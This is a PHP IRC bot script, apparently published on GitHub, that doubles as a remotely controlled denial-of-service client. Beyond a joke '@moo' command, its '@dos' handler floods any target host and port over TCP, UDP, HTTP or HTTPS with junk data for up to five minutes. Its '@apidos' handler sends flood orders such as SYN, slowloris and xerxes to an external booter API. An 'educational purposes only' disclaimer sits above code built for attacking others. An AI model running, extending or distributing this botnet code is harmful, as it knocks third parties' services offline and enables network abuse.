<?php
/*
 * Based on a wikihow article: https://www.wikihow.com/Develop-an-IRC-Bot.
 * Remember, this has been made for educational purposes only, I am, in no way, responsible for any damages done with this, or with edited versions.
 */

//config
$s = 'chat.freenode.net'; 					//server
$p = 6667; 							//port
$n = 'BusterzBott_'; 						//Nickname
$i = 'buszbot';						//ident
$g = 'BusterzBot (https://github.com/lulzamp/BusterzBot)';	//gecos
$api_domain = 'apidoma.in';					//api domain for @apidos (can be a subdomain too)
$chans = array(						//channels
	'#randomchan'
);

//connection
$sock  = fsockopen($s,$p, $errno, $errstr);
//$error = socket_connect($sock, $s, $p);

if($sock === false){
	$errorcode   = socket_last_error();
	$errorstring = socket_strerror($errorcode);
	
	die('Error '.$errorcode.': '.$errorstring."\n");
}

//register
fwrite($sock, "NICK $n\r\n");
fwrite($sock, "USER $i * 8 :$g\r\n");

//actually handle socket output
while(is_resource($sock)){
	//read $sock
	$data = trim(fread($sock, 1024));
	echo $data."\n";
	
	$d = explode(' ', $data);
	$d = array_pad($d, 10, '');
	
	//ping handler
	if($d[0] === 'PING'){
		fwrite($sock, 'PONG '.$d[1]."\r\n");
	}
	
	if($d[1] === '376' || $d[1] === '422'){
		foreach($chans as $c){
			fwrite($sock, 'JOIN '.$c."\r\n");
		}
	}
	
	//add your own commands
	//@moo
	if($d[3] == ':@moo'){
		$moo = 'M'.str_repeat('o', mt_rand(2,15));
		fwrite($sock, 'PRIVMSG '.$d[2]." :$moo\r\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
	}
	
	//make it join
	//@joinchans
	if($d[3] == ':@joinchans'){
		foreach($chans as $c){
			fwrite($sock, 'JOIN '.$c."\r\n");
			fwrite($sock, 'PRIVMSG '.$c.' :idle.'."\r\n");
		}
	}
	
	//make it leave
	//@leavechans
	if($d[3] == ':@leavechans'){
		foreach($chans as $c){
			fwrite($sock, 'PART '.$c."\r\n");
		}
	}
	
	//@bbhelp
	if($d[3] == ':@bbhelp'){
		fwrite($sock, 'PRIVMSG '.$d[2].' :<BusterzBot Help>'."\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :--> @bbhelp | Display this'."\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :--> @moo | Say moo lol'."\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :--> @dos <method (tcp,udp,http,https)> <target> <port> <time> | Sends a DoS Attack using PHP Functions'."\r\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :--> @apidos <API Key> <method (rawudp,tcp-syn,tcp-ack,xerxes,slowloris)> <target> <port> <time> | Sends a DoS Attack using an API'."\n\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :</BusterzBot Help>'."\r\n");
		fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
	}
	
	//@dos
	if($d[3] == ':@dos'){
		$m = array('tcp', 'udp', 'http', 'https');
		$mt = 300; //max flooding time
		$error = 0;
		$i = 0;
		$packets = 0;
		$out = 'X';
		$dos = array($d[4], $d[5], $d[6], $d[7]);
		if(empty($d[4])){
			fwrite($sock, 'PRIVMSG '.$d[2].' :<BusterzBot Help>'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @bbhelp | Display this'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @moo | Say moo lol'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @dos <method (tcp,udp,http,https)> <target> <port> <time> | Sends a DoS Attack using PHP Functions'."\r\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @apidos <API Key> <method (rawudp,tcp-syn,tcp-ack,xerxes,slowloris)> <target> <port> <time> | Sends a DoS Attack using an API'."\n\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :</BusterzBot Help>'."\r\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
		}else{
			if(!in_array($dos[0], $m)){
				fwrite($sock, "PRIVMSG $d[2] :Error: invalid method; $dos[0]\r\n");
				$error++;
			}
			if($dos[3] > $mt){
				$dos[3] = $mt;
			}elseif($dos[3] < 1){
				$dos[3] = 1;
			}
			$time = time()+$dos[3];
			for($i;$i<65535;$i++){
				$out .= 'X';
			}
			switch($dos[0]){
				case $m[0]:
					$attk = fsockopen('tcp://'.$dos[1], $dos[2]);
					break;
				case $m[1]:
					$attk = fsockopen('udp://'.$dos[1], $dos[2]);
					break;
				case $m[2]:
					$attk = fsockopen('http://'.$dos[1], 80);
					break;
				case $m[3]:
					$attk = fsockopen('ssl://'.$dos[1], 443);
					break;
				default:
					fwrite($sock, "PRIVMSG $d[2] :Error: invalid method; $dos[0]\r\n");
					$error++;
			}
			if($error < 1){
				fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully started flooding '.$dos[1].':'.$dos[2].' using '.$dos[0].".\r\n");
				while(1){
					if(time() > $time){
						fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully flooded '.$dos[1].':'.$dos[2].' for '.$dos[3]." seconds using $dos[1], sent $packets packets.\r\n");
						break;
					}
					if($error > 0){
						break;
					}
					$sent = fwrite($attk, $out);
					if($sent){
						$packets++;
					}
				}
			}else{
				fwrite($sock, 'PRIVMSG '.$d[2].' :Error: too many errors.'."\r\n");
			}
			fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
		}
	}
	
	//@apidos
	if($d[3] == ':@apidos'){ //might be adding a stopall function
		$m = array('rawudp', 'tcp-syn', 'tcp-ack', 'xerxes', 'slowloris'); //add methods corresponding to the API
		$mt = 300; //max flooding time
		$error = 0;
		$api = 'api'.rand(1,3); //choose one of the three api's to call
		$apidos = array($d[4], $d[5], $d[6], $d[7], $d[8]);
		if(empty($d[4])){
			fwrite($sock, 'PRIVMSG '.$d[2].' :<BusterzBot Help>'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @bbhelp | Display this'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @moo | Say moo lol'."\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @dos <method (tcp,udp,http,https)> <target> <port> <time> | Sends a DoS Attack using PHP Functions'."\r\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :--> @apidos <API Key> <method (rawudp,tcp-syn,tcp-ack,xerxes,slowloris)> <target> <port> <time> | Sends a DoS Attack using an API'."\n\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :</BusterzBot Help>'."\r\n");
			fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
		}else{
			if(!in_array($apidos[2], $m)){
				fwrite($sock, "PRIVMSG $d[2] :Error: invalid method; $apidos[1]\r\n");
				$error++;
			}
			if($apidos[4] > $mt){
				$apidos[4] = $mt;
			}elseif($apidos[4] < 1){
				$apidos[4] = 1;
			}
			$attk = file_get_contents('http://'.$api_domain.'/api.php?key='.$apidos[0].'&t='.$apidos[2].'&p='.$apidos[3].'&m='.$apidos[1].'&ts='.$apidos[4]);
			if($error < 1){
				switch($attk){
					case 'success':
						fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully started flooding '.$apidos[2].':'.$apidos[3]." for $apidos[5].\r\n");
						break;
					case 'blacklisted':
						fwrite($sock, 'PRIVMSG '.$d[2].' :Error: can\'t flood '.$apidos[2].':'.$apidos[3].' because of API blacklist.'."\r\n");
						break;
					case 'fail; key':
						fwrite($sock, 'PRIVMSG '.$d[2].' :Error: invalid key.'."\r\n");
						break;
					case 'fail; ip':
						fwrite($sock, 'PRIVMSG '.$d[2].' :Error: invalid IP Address.'."\r\n");
						break;
					case 'fail; port':
						fwrite($sock, 'PRIVMSG '.$d[2].' :Error: invalid Port.'."\r\n");
						break;
					default:
						fwrite($sock, 'PRIVMSG '.$d[2].' :Error: unspecified error.'."\r\n");
				}
			}else{
				fwrite($sock, 'PRIVMSG '.$d[2].' :Error: too many errors.'."\r\n");
			}
			fwrite($sock, 'PRIVMSG '.$d[2].' :idle.'."\r\n");
		}
	}
}
